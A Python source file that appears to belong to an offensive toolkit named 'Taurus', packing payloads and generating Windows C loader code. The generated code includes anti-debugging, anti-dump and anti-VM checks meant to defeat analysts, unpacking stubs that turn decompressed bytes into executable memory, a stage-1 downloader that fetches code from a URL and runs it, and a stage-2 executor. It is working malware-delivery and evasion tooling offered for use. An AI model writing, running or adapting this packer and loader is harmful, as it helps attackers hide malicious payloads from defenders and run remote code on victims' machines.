"""
Advanced Payload Packer for Taurus
Implements sophisticated packing and compression:
- Multiple compression algorithms (zlib, LZMA, custom)
- Anti-unpacking techniques
- Encrypted sections
- Runtime unpacking stubs
- Multi-stage loading
"""
import zlib
import struct
import os
from typing import Tuple, Dict, Optional
from utils.logger import get_logger

logger = get_logger()


class CompressionEngine:
    """Multiple compression algorithms"""
    
    @staticmethod
    def compress_zlib(data: bytes, level: int = 9) -> bytes:
        """Compress with zlib (fast, good ratio)"""
        return zlib.compress(data, level)
    
    @staticmethod
    def compress_lzma(data: bytes) -> bytes:
        """Compress with LZMA (best ratio, slower)"""
        try:
            import lzma
            return lzma.compress(data, preset=9)
        except ImportError:
            logger.warning("LZMA not available, using zlib")
            return CompressionEngine.compress_zlib(data)
    
    @staticmethod
    def compress_custom(data: bytes) -> bytes:
        """Custom compression algorithm"""
        # Simple RLE (Run-Length Encoding) for demonstration
        compressed = bytearray()
        i = 0
        while i < len(data):
            count = 1
            while i + count < len(data) and data[i] == data[i + count] and count < 255:
                count += 1
            compressed.append(count)
            compressed.append(data[i])
            i += count
        return bytes(compressed)
    
    @staticmethod
    def decompress_zlib(data: bytes) -> bytes:
        """Decompress zlib"""
        return zlib.decompress(data)
    
    @staticmethod
    def decompress_lzma(data: bytes) -> bytes:
        """Decompress LZMA"""
        try:
            import lzma
            return lzma.decompress(data)
        except ImportError:
            return CompressionEngine.decompress_zlib(data)


class AntiUnpacking:
    """Anti-unpacking and anti-debugging for packed payloads"""
    
    @staticmethod
    def generate_anti_dump_code() -> str:
        """Generate C code to prevent memory dumping"""
        return '''
// Anti-dump protection
#include <windows.h>

void anti_dump() {
    // Check for debugger
    if (IsDebuggerPresent()) {
        ExitProcess(0);
    }
    
    // Check for remote debugger
    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
    if (isDebuggerPresent) {
        ExitProcess(0);
    }
    
    // Timing check
    DWORD start = GetTickCount();
    Sleep(1000);
    DWORD end = GetTickCount();
    if ((end - start) < 900) {  // Sleep was accelerated
        ExitProcess(0);
    }
    
    // Memory protection
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery((LPVOID)anti_dump, &mbi, sizeof(mbi));
    if (mbi.Protect != PAGE_EXECUTE_READ) {
        // Memory has been modified
        ExitProcess(0);
    }
}
'''
    
    @staticmethod
    def generate_anti_vm_code() -> str:
        """Generate anti-VM checks for unpacker"""
        return '''
// Anti-VM checks
BOOL is_vm() {
    // Check for VM processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    
    const char* vm_processes[] = {
        "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe"
    };
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            for (int i = 0; i < 3; i++) {
                if (strcmp(pe.szExeFile, vm_processes[i]) == 0) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return FALSE;
}
'''


class RuntimeUnpacker:
    """Generate runtime unpacking stubs"""
    
    @staticmethod
    def generate_unpacker_stub(compression_method: str = 'zlib') -> str:
        """Generate C code for runtime unpacking"""
        if compression_method == 'zlib':
            return RuntimeUnpacker._generate_zlib_unpacker()
        elif compression_method == 'lzma':
            return RuntimeUnpacker._generate_lzma_unpacker()
        else:
            return RuntimeUnpacker._generate_custom_unpacker()
    
    @staticmethod
    def _generate_zlib_unpacker() -> str:
        """Generate zlib unpacker stub"""
        return '''
// Zlib unpacker stub
#include <windows.h>
#include <zlib.h>

unsigned char* unpack_payload(unsigned char* packed, size_t packed_size, size_t* unpacked_size) {
    // Anti-debugging checks
    if (IsDebuggerPresent()) return NULL;
    
    // Allocate buffer for unpacked data
    *unpacked_size = *(size_t*)packed;  // First 8 bytes = unpacked size
    unsigned char* unpacked = (unsigned char*)VirtualAlloc(
        NULL, *unpacked_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    
    if (!unpacked) return NULL;
    
    // Decompress
    uLongf dest_len = *unpacked_size;
    int result = uncompress(unpacked, &dest_len, packed + 8, packed_size - 8);
    
    if (result != Z_OK) {
        VirtualFree(unpacked, 0, MEM_RELEASE);
        return NULL;
    }
    
    // Change to executable
    DWORD old_protect;
    VirtualProtect(unpacked, *unpacked_size, PAGE_EXECUTE_READ, &old_protect);
    
    return unpacked;
}
'''
    
    @staticmethod
    def _generate_lzma_unpacker() -> str:
        """Generate LZMA unpacker stub"""
        return '''
// LZMA unpacker stub
#include <windows.h>
#include <lzma.h>

unsigned char* unpack_payload_lzma(unsigned char* packed, size_t packed_size, size_t* unpacked_size) {
    // Anti-VM check
    if (is_vm()) return NULL;
    
    *unpacked_size = *(size_t*)packed;
    unsigned char* unpacked = (unsigned char*)VirtualAlloc(
        NULL, *unpacked_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    
    if (!unpacked) return NULL;
    
    // LZMA decompression
    lzma_stream strm = LZMA_STREAM_INIT;
    lzma_ret ret = lzma_alone_decoder(&strm, UINT64_MAX);
    
    if (ret != LZMA_OK) {
        VirtualFree(unpacked, 0, MEM_RELEASE);
        return NULL;
    }
    
    strm.next_in = packed + 8;
    strm.avail_in = packed_size - 8;
    strm.next_out = unpacked;
    strm.avail_out = *unpacked_size;
    
    ret = lzma_code(&strm, LZMA_FINISH);
    lzma_end(&strm);
    
    if (ret != LZMA_STREAM_END) {
        VirtualFree(unpacked, 0, MEM_RELEASE);
        return NULL;
    }
    
    DWORD old_protect;
    VirtualProtect(unpacked, *unpacked_size, PAGE_EXECUTE_READ, &old_protect);
    
    return unpacked;
}
'''
    
    @staticmethod
    def _generate_custom_unpacker() -> str:
        """Generate custom unpacker stub"""
        return '''
// Custom RLE unpacker
unsigned char* unpack_custom(unsigned char* packed, size_t packed_size, size_t* unpacked_size) {
    *unpacked_size = *(size_t*)packed;
    unsigned char* unpacked = (unsigned char*)malloc(*unpacked_size);
    
    size_t in_pos = 8;
    size_t out_pos = 0;
    
    while (in_pos < packed_size && out_pos < *unpacked_size) {
        unsigned char count = packed[in_pos++];
        unsigned char value = packed[in_pos++];
        
        for (int i = 0; i < count; i++) {
            unpacked[out_pos++] = value;
        }
    }
    
    return unpacked;
}
'''


class MultiStageLoader:
    """Multi-stage payload loading"""
    
    @staticmethod
    def generate_stage1() -> str:
        """Generate stage 1 loader (minimal, downloads stage 2)"""
        return '''
// Stage 1 - Minimal downloader
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

void stage1(const char* url) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    
    DWORD size = 0;
    DWORD downloaded = 0;
    unsigned char buffer[4096];
    unsigned char* stage2 = NULL;
    size_t total_size = 0;
    
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &downloaded) && downloaded > 0) {
        stage2 = (unsigned char*)realloc(stage2, total_size + downloaded);
        memcpy(stage2 + total_size, buffer, downloaded);
        total_size += downloaded;
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    // Execute stage 2
    if (stage2) {
        void (*stage2_func)() = (void(*)())stage2;
        stage2_func();
        free(stage2);
    }
}
'''
    
    @staticmethod
    def generate_stage2() -> str:
        """Generate stage 2 loader (unpacks and executes final payload)"""
        return '''
// Stage 2 - Unpacker and executor
void stage2(unsigned char* packed_payload, size_t size) {
    // Anti-debugging
    if (IsDebuggerPresent()) return;
    
    // Unpack payload
    size_t unpacked_size;
    unsigned char* payload = unpack_payload(packed_payload, size, &unpacked_size);
    
    if (!payload) return;
    
    // Execute payload
    void (*entry_point)() = (void(*)())payload;
    entry_point();
}
'''


class AdvancedPacker:
    """Main packer combining all techniques"""
    
    def __init__(self):
        self.compressor = CompressionEngine()
        self.anti_unpack = AntiUnpacking()
        self.unpacker = RuntimeUnpacker()
        self.multi_stage = MultiStageLoader()
    
    def pack_payload(
        self,
        payload: bytes,
        compression: str = 'zlib',
        encryption: Optional[str] = None,
        anti_debug: bool = True,
        multi_stage: bool = False
    ) -> Tuple[bytes, Dict]:
        """
        Pack payload with specified options
        
        Args:
            payload: Original payload
            compression: Compression method (zlib, lzma, custom)
            encryption: Encryption method (aes, chacha20, etc.)
            anti_debug: Include anti-debugging checks
            multi_stage: Use multi-stage loading
        
        Returns:
            (packed_payload, metadata)
        """
        logger.info(f"Packing payload ({len(payload)} bytes)")
        
        metadata = {
            'original_size': len(payload),
            'compression': compression,
            'encryption': encryption,
            'anti_debug': anti_debug,
            'multi_stage': multi_stage
        }
        
        # Step 1: Compress
        if compression == 'zlib':
            compressed = self.compressor.compress_zlib(payload)
        elif compression == 'lzma':
            compressed = self.compressor.compress_lzma(payload)
        else:
            compressed = self.compressor.compress_custom(payload)
        
        logger.info(f"Compressed to {len(compressed)} bytes ({len(compressed)/len(payload)*100:.1f}%)")
        metadata['compressed_size'] = len(compressed)
        
        # Step 2: Encrypt (if requested)
        if encryption:
            from utils.crypto_enhanced import get_crypto_manager
            crypto = get_crypto_manager()
            encrypted, keys = crypto.encrypt_payload(compressed, method=encryption)
            metadata['encryption_keys'] = keys
            final_payload = encrypted
        else:
            final_payload = compressed
        
        # Step 3: Add size header
        size_header = struct.pack('<Q', len(payload))  # 8 bytes, little-endian
        packed = size_header + final_payload
        
        metadata['final_size'] = len(packed)
        metadata['compression_ratio'] = len(packed) / len(payload)
        
        logger.success(f"Packed payload: {len(packed)} bytes (ratio: {metadata['compression_ratio']:.2f})")
        
        return packed, metadata
    
    def generate_loader(
        self,
        metadata: Dict,
        output_format: str = 'exe'
    ) -> str:
        """
        Generate loader code
        
        Args:
            metadata: Packing metadata
            output_format: Output format (exe, dll, shellcode)
        
        Returns:
            Loader source code
        """
        compression = metadata.get('compression', 'zlib')
        anti_debug = metadata.get('anti_debug', True)
        
        code = '#include <windows.h>\n'
        code += '#include <stdio.h>\n\n'
        
        # Add anti-debugging if requested
        if anti_debug:
            code += self.anti_unpack.generate_anti_dump_code()
            code += '\n'
            code += self.anti_unpack.generate_anti_vm_code()
            code += '\n'
        
        # Add unpacker
        code += self.unpacker.generate_unpacker_stub(compression)
        code += '\n'
        
        # Add main function
        code += '''
int main() {
    // Anti-debugging checks
    anti_dump();
    
    if (is_vm()) {
        return 1;
    }
    
    // Embedded packed payload
    unsigned char packed_payload[] = {
        // Payload bytes would be inserted here
    };
    
    size_t unpacked_size;
    unsigned char* payload = unpack_payload(
        packed_payload,
        sizeof(packed_payload),
        &unpacked_size
    );
    
    if (payload) {
        // Execute payload
        void (*entry)() = (void(*)())payload;
        entry();
    }
    
    return 0;
}
'''
        
        return code
    
    def get_packing_report(self, metadata: Dict) -> str:
        """Generate packing report"""
        return f"""
# Payload Packing Report

## Original Payload
- Size: {metadata['original_size']} bytes

## Compression
- Method: {metadata['compression']}
- Compressed Size: {metadata.get('compressed_size', 'N/A')} bytes
- Compression Ratio: {metadata.get('compression_ratio', 1.0):.2%}

## Encryption
- Method: {metadata.get('encryption', 'None')}

## Final Packed Payload
- Size: {metadata['final_size']} bytes
- Reduction: {(1 - metadata['compression_ratio']) * 100:.1f}%

## Protection Features
- Anti-Debugging: {metadata['anti_debug']}
- Multi-Stage: {metadata['multi_stage']}
"""


# Global instance
_packer = None


def get_advanced_packer() -> AdvancedPacker:
    """Get global packer instance"""
    global _packer
    if _packer is None:
        _packer = AdvancedPacker()
    return _packer
